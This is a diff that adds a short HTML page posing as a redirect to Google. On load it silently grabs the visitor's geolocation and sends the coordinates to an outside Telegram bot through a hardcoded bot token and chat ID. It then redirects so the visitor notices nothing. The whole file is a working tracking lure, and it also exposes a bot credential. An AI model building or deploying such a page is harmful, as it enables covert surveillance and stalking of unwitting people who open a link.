@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="2;url=https://www.google.com">
+</head>
+<body>
+    <script>
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            
+            // Remplace par ton token et ton ID
+            let token = "7922880454:AAEeFEqeWZLra_dZHAtdtM9Zwezvw_50cN4";
+            let chat_id = "5646060786";
+            
+            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 Position: ${lat},${lon}`;
+            fetch(url);
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation);
+        }
+    </script>
+</body>
+</html>
